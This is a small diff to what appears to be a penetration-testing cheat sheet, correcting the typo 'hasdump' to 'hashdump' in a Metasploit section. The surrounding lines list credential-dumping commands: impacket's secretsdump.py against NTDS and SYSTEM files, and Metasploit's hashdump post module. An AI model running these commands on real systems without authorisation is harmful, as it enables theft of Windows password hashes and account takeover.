@@ -48,6 +48,6 @@ secretsdump.py -ntds <NTDS file> -system <SYSTEM file> -hashes lmhash:nthash LOC
 
 ### Metasploit
 ```
-hasdump # on meterpreter session
+hashdump # on meterpreter session
 use post/windows/gather/hashdump
 ```
